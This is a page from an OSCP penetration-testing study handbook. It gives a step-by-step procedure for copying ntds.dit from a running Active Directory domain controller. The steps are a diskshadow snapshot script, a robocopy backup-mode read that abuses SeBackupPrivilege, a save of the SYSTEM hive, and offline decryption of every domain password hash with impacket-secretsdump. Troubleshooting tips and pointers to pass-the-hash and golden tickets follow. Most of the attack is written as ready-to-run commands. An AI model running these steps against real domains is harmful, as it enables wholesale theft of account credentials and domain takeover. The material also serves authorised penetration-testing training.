---
title: "NTDS.dit Extraction"
slug: ntds-dit-extraction
category: notes
handbook: oscp
tags: ["active-directory", "credentials"]
draft: false
pubDatetime: 2026-08-29T17:33:35+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "Offline route to every hash in the domain: copy `ntds.dit` off a running DC and decrypt it on Kali."
---
Offline route to every hash in the domain: copy `ntds.dit` off a running DC and decrypt it on Kali. The alternative to [DCSync](/collections/oscp/dcsync) when the account has no replication rights but there is a shell on the DC with SeBackupPrivilege or local admin. DCSync asks the DC to hand secrets over the network; this route reads the database from disk.

`ntds.dit` is exclusively locked by the ESE database engine while the DC runs, so a direct copy fails even with backup privileges. A Volume Shadow Copy snapshot sidesteps the lock, and the copy still carries the original NTFS ACLs, so the final read must use SeBackupPrivilege.

## diskshadow: snapshot C:

`diskshadow` has no usable inline mode, so the script goes into a file first.

**DiskShadow demands CRLF line endings.** Given an LF-only script, it silently eats the last character of every line: `persistent` became `persisten` (usage error, script aborted at line 1) and `expose {id} E:` became `expose {id} E` (mount went to a phantom location, no drive ever appeared). On Kali, `unix2dos` the file before uploading; verify with `cat -A`, where every line must end `^M$`.

The reliable way over evil-winrm is to build the file on Kali and upload it. Multi-line pastes are unreliable in general: evil-winrm's readline has dropped characters mid-line (`drv` becoming `dr`, which broke an alias reference). Always `type` or `cat -A` the file before running it.

```bash
cat > mk.txt << 'EOF'
set context persistent
begin backup
add volume C: alias drv0
create
expose %drv0% F:
end backup
exit
EOF
unix2dos mk.txt
cat -A mk.txt
```

```powershell
upload mk.txt
diskshadow /s mk.txt
```

PowerShell one-liners with backtick-`n (`Set-Content f "line1`nline2"`) produce LF-only files and hit the same eaten-character failure; the here-string pasted as a multi-line block goes through console input and keeps CRLF, but the safer habit is Kali-built files for anything longer than two lines.

- `persistent` keeps the snapshot alive after diskshadow exits; without it the copy vanishes with the process.
- `expose %drv0% F:` mounts the snapshot as drive F:. Any free letter works.
- Writer errors during `create` are normal noise. What matters is the snapshot existing and the expose succeeding.

If the expose fails anyway, the snapshot survives and can be mounted from a second script, since interactive diskshadow dies over evil-winrm (`Error reading from console. The pipe has been ended.`). `list shadows all` prints the IDs and their state; `Not exposed` means the snapshot is there, only unmounted:

```bash
cat > ex.txt << 'EOF'
list shadows all
expose {shadow-copy-id} F:
exit
EOF
unix2dos ex.txt
```

If diskshadow answers `The shadow copy is already exposed` but the drive does not exist, the mount point is lost in some unlisted state (a truncated script line can expose to a location nothing lists, which `mountvol` will not show). Do not hunt for it; create a fresh snapshot on a different drive letter instead. Multiple persistent snapshots of C: coexist fine.

## Copy ntds.dit and the SYSTEM hive

```cmd
robocopy /b F:\windows\ntds . ntds.dit
reg save hklm\system system
```

`robocopy /b` is the privilege abuse: backup mode reads files with SeBackupPrivilege, so the ACLs on `F:\windows\ntds` that deny a normal user do not matter. A plain `copy` gets ACL-checked and refused.

The SYSTEM hive is not optional: it holds the boot key that decrypts the database. Without it, secretsdump gets nothing usable.

## Offline dump

Download both files (evil-winrm `download`, or an SMB transfer per [File Transfers](/collections/oscp/file-transfers)):

```bash
impacket-secretsdump -system system -ntds ntds.dit local
```

`local` here is the positional target argument, not a flag: passing it instead of a host switches secretsdump to offline extraction from the named files. Output is the same `user:rid:lmhash:nthash:::` format as a DCSync dump, plus Kerberos keys. The `krbtgt` row feeds [Silver and Golden Tickets](/collections/oscp/silver-and-golden-tickets); everything else goes to pass-the-hash ([AD Lateral Movement](/collections/oscp/ad-lateral-movement)) before cracking.
